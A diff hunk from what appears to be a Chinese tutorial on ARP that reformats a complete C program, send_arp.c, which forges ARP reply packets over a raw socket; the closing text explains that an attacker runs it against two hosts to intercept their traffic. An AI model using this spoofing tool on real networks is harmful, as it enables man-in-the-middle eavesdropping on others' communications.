@@ -73,8 +73,146 @@ A 收到 B 的 ARP 应答后，知道了 B 的 MAC 地址，就可以给 B 发�
 
 首先是发送 ARP 应答的代码：
 
-```
- //Filename: send_arp.c #include <stdio.h> #include <ctype.h> #include <stdlib.h> #include <string.h> #include <errno.h> #include <netdb.h> #include <net/if.h>// struct ifreq #include <sys/ioctl.h> // ioctl、SIOCGIFADDR #include <sys/socket.h> #include <arpa/inet.h> #include <linux/if_ether.h> #include <netpacket/packet.h> // struct sockaddr_l ​ ​ #define ETH_HW_ADDR_LEN 6 #define IP_ADDR_LEN 4 #define ARP_FRAME_TYPE 0x0806 #define ETHER_HW_TYPE 1 #define IP_PROTO_TYPE 0x0800 #define OP_ARP_REQUEST 2 ​ #define DEFAULT_DEVICE "eth0" ​ struct arp_packet {         u_char targ_hw_addr[ETH_HW_ADDR_LEN];         u_char src_hw_addr[ETH_HW_ADDR_LEN];         u_short frame_type;         u_short hw_type;         u_short prot_type;         u_char hw_addr_size;         u_char prot_addr_size;         u_short op;         u_char sndr_hw_addr[ETH_HW_ADDR_LEN];         u_char sndr_ip_addr[IP_ADDR_LEN];         u_char rcpt_hw_addr[ETH_HW_ADDR_LEN];         u_char rcpt_ip_addr[IP_ADDR_LEN];         u_char padding[18]; }; ​ void die(char*); void get_ip_addr(struct in_addr*, char*); void get_hw_addr(char*, char*); ​ int main(int argc, char** argv) {     struct in_addr src_in_addr,targ_in_addr;     struct arp_packet pkt;     struct sockaddr_ll sa;     struct ifreq req;     int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));     if (sock < 0) {         printf("Initial raw socket failed");         return -1;     }else         printf("%d\n", sock); ​     pkt.frame_type = htons(ARP_FRAME_TYPE);     pkt.hw_type = htons(ETHER_HW_TYPE);     pkt.prot_type = htons(IP_PROTO_TYPE);     pkt.hw_addr_size = ETH_HW_ADDR_LEN;     pkt.prot_addr_size = IP_ADDR_LEN;     pkt.op=htons(OP_ARP_REQUEST); ​     get_hw_addr(pkt.targ_hw_addr,argv[4]);     get_hw_addr(pkt.rcpt_hw_addr,argv[4]);     get_hw_addr(pkt.src_hw_addr,argv[2]);     get_hw_addr(pkt.sndr_hw_addr,argv[2]); ​     get_ip_addr(&src_in_addr,argv[1]);     get_ip_addr(&targ_in_addr,argv[3]); ​     memcpy(pkt.sndr_ip_addr,&src_in_addr,IP_ADDR_LEN);     memcpy(pkt.rcpt_ip_addr,&targ_in_addr,IP_ADDR_LEN); ​     bzero(pkt.padding,18); ​     strncpy(req.ifr_name, DEFAULT_DEVICE, IFNAMSIZ); //指定网卡名称     if(-1 == ioctl(sock, SIOCGIFINDEX, &req))  //获取网络接口     {         perror("ioctl");             close(sock);          exit(-1);     } ​     /*将网络接口赋值给原始套接字地址结构*/     bzero(&sa, sizeof(sa));     sa.sll_ifindex = req.ifr_ifindex; ​     int res = sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sa, sizeof(sa));     printf("res: %d\n", res);     if(res < 0){         perror("sendto");         exit(1);     }     exit(0); } ​ void die(char* str){     fprintf(stderr,"%s\n",str);     exit(1); } ​ void get_ip_addr(struct in_addr* in_addr,char* str){ ​     struct hostent *hostp; ​     in_addr->s_addr=inet_addr(str);     if(in_addr->s_addr == -1){         if( (hostp = gethostbyname(str)))             bcopy(hostp->h_addr,in_addr,hostp->h_length);         else {             fprintf(stderr,"send_arp: unknown host %s\n",str);             exit(1);         }     } } ​ void get_hw_addr(char* buf,char* str){     int i;     char c,val; ​     for(i=0;i<ETH_HW_ADDR_LEN;i++){         if( !(c = tolower(*str++))) die("Invalid hardware address");         if(isdigit(c)) val = c-'0';         else if(c >= 'a' && c <= 'f') val = c-'a'+10;         else die("Invalid hardware address"); ​         *buf = val << 4;         if( !(c = tolower(*str++))) die("Invalid hardware address");         if(isdigit(c)) val = c-'0';         else if(c >= 'a' && c <= 'f') val = c-'a'+10;         else die("Invalid hardware address"); ​         *buf++ |= val; ​         if(*str == ':')str++;     } }
+```c
+//Filename: send_arp.c
+#include <stdio.h>
+#include <ctype.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <netdb.h>
+#include <net/if.h>// struct ifreq
+#include <sys/ioctl.h> // ioctl、SIOCGIFADDR
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <linux/if_ether.h>
+#include <netpacket/packet.h> // struct sockaddr_l
+
+
+#define ETH_HW_ADDR_LEN 6
+#define IP_ADDR_LEN 4
+#define ARP_FRAME_TYPE 0x0806
+#define ETHER_HW_TYPE 1
+#define IP_PROTO_TYPE 0x0800
+#define OP_ARP_REQUEST 2
+
+#define DEFAULT_DEVICE "eth0"
+
+struct arp_packet {
+        u_char targ_hw_addr[ETH_HW_ADDR_LEN];
+        u_char src_hw_addr[ETH_HW_ADDR_LEN];
+        u_short frame_type;
+        u_short hw_type;
+        u_short prot_type;
+        u_char hw_addr_size;
+        u_char prot_addr_size;
+        u_short op;
+        u_char sndr_hw_addr[ETH_HW_ADDR_LEN];
+        u_char sndr_ip_addr[IP_ADDR_LEN];
+        u_char rcpt_hw_addr[ETH_HW_ADDR_LEN];
+        u_char rcpt_ip_addr[IP_ADDR_LEN];
+        u_char padding[18];
+};
+
+void die(char*);
+void get_ip_addr(struct in_addr*, char*);
+void get_hw_addr(char*, char*);
+
+int main(int argc, char** argv)
+{
+    struct in_addr src_in_addr,targ_in_addr;
+    struct arp_packet pkt;
+    struct sockaddr_ll sa;
+    struct ifreq req;
+    int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (sock < 0) {
+        printf("Initial raw socket failed");
+        return -1;
+    }else
+        printf("%d\n", sock);
+
+    pkt.frame_type = htons(ARP_FRAME_TYPE);
+    pkt.hw_type = htons(ETHER_HW_TYPE);
+    pkt.prot_type = htons(IP_PROTO_TYPE);
+    pkt.hw_addr_size = ETH_HW_ADDR_LEN;
+    pkt.prot_addr_size = IP_ADDR_LEN;
+    pkt.op=htons(OP_ARP_REQUEST);
+
+    get_hw_addr(pkt.targ_hw_addr,argv[4]);
+    get_hw_addr(pkt.rcpt_hw_addr,argv[4]);
+    get_hw_addr(pkt.src_hw_addr,argv[2]);
+    get_hw_addr(pkt.sndr_hw_addr,argv[2]);
+
+    get_ip_addr(&src_in_addr,argv[1]);
+    get_ip_addr(&targ_in_addr,argv[3]);
+
+    memcpy(pkt.sndr_ip_addr,&src_in_addr,IP_ADDR_LEN);
+    memcpy(pkt.rcpt_ip_addr,&targ_in_addr,IP_ADDR_LEN);
+
+    bzero(pkt.padding,18);
+
+    strncpy(req.ifr_name, DEFAULT_DEVICE, IFNAMSIZ); //指定网卡名称
+    if(-1 == ioctl(sock, SIOCGIFINDEX, &req))  //获取网络接口
+    {
+        perror("ioctl");    
+        close(sock); 
+        exit(-1);
+    }
+
+    /*将网络接口赋值给原始套接字地址结构*/
+    bzero(&sa, sizeof(sa));
+    sa.sll_ifindex = req.ifr_ifindex;
+
+    int res = sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sa, sizeof(sa));
+    printf("res: %d\n", res);
+    if(res < 0){
+        perror("sendto");
+        exit(1);
+    }
+    exit(0);
+}
+
+void die(char* str){
+    fprintf(stderr,"%s\n",str);
+    exit(1);
+}
+
+void get_ip_addr(struct in_addr* in_addr,char* str){
+
+    struct hostent *hostp;
+
+    in_addr->s_addr=inet_addr(str);
+    if(in_addr->s_addr == -1){
+        if( (hostp = gethostbyname(str)))
+            bcopy(hostp->h_addr,in_addr,hostp->h_length);
+        else {
+            fprintf(stderr,"send_arp: unknown host %s\n",str);
+            exit(1);
+        }
+    }
+}
+
+void get_hw_addr(char* buf,char* str){
+    int i;
+    char c,val;
+
+    for(i=0;i<ETH_HW_ADDR_LEN;i++){
+        if( !(c = tolower(*str++))) die("Invalid hardware address");
+        if(isdigit(c)) val = c-'0';
+        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
+        else die("Invalid hardware address");
+
+        *buf = val << 4;
+        if( !(c = tolower(*str++))) die("Invalid hardware address");
+        if(isdigit(c)) val = c-'0';
+        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
+        else die("Invalid hardware address");
+
+        *buf++ |= val;
+
+        if(*str == ':')str++;
+    }
+}
 ```
 
 假设 A 是数据发送方，B 是数据接收方，C 是攻击者，C 想窃取 A 发送给 B 的数据，那么 C 运行这个程序需要 4 个参数，分别是：B 的 IP 地址，C 的 MAC 地址，A 的 IP 地址，A 的 MAC 地址。在上面那个例子中，就是：
